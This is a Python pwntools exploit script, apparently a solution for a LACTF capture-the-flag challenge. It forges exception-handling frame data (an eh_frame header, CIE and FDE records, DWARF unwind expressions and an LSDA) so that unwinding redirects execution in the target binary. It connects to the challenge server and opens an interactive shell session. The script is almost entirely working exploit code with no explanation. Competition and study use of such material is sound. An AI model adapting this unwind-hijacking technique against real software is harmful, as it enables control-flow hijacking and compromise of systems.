#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

def conn():
    if args.REMOTE:
        r = remote("chall.lac.tf", 31152)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)

    return r

def main():
    r = conn()

    lsda = b"\xff\x9b\xe3\xc3\x06\x01\x10\x13\x05(\x01#\x05\x00\x00;\x05G\x00U\x05\x00\x00\xf3\xd0\x01\x00\x00\x5f\x1f\x00\x00"
    f_base = p32(exe.sym._Z1fv - exe.sym.__GNU_EH_FRAME_HDR, signed=True)
    f_range = p32(exe.sym._Z1gv - exe.sym._Z1fv)
    g_base = p32(exe.sym._Z1gv - exe.sym.__GNU_EH_FRAME_HDR, signed=True)
    g_range = p32(exe.sym.main - exe.sym._Z1gv)

    rsp, rip, rdx = p8(7), p8(16), p8(1)
    def_cfa, expression, val_expression = p8(0x0c), p8(0x10), p8(0x16)
    bregx, deref, const2u, plus, minus = p8(0x92), p8(0x06), p8(0x0a), p8(0x22), p8(0x1c)
    expr = lambda r, p: expression + r + p8(len(p)) + p
    val_expr = lambda r, p: val_expression + r + p8(len(p)) + p
    prog = (def_cfa + rsp + p8(16) + # cfa = rsp + 16
            val_expr(rip, bregx + rsp + p8(8) + deref + const2u + p16(0x6a) + minus) + # rip = *(rsp + 8) - 0x6a
            expr(rdx, bregx + rsp + p8(8) + deref + const2u + p16(0xdaa) + plus)) # &rbx = *(rsp + 8) + 0xdaa

    cie1 = p32(0) + p8(1) + b"zR\x00" + p8(1) + p8(0x78) + rip + p8(1) + b"\x1b"
    cie1 = p32(len(cie1)) + cie1
    fde1 = p32(len(cie1) + 4) + p32(0) + f_range + p8(0) + prog
    fde1 = p32(len(fde1)) + fde1

    cie2 = p32(0) + p8(1) + b"zPLR\x00" + p8(1) + p8(0x78) + rip + p8(7) + b"\x9b\x9e\x1f\x00\x00\x1b\x1b"
    cie2 = p32(len(cie2)) + cie2
    fde2 = p32(len(cie2) + 4) + p32(0) + g_range + p8(4) + p32(4)
    fde2 = p32(len(fde2)) + fde2

    payload = b"\x01\x1b\x03\x3b" + p32(0) + p32(2) + f_base + p32(28 + len(cie1)) + g_base + p32(28 + len(cie1) + len(fde1) + len(cie2)) + cie1 + fde1 + cie2 + fde2 + lsda
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()
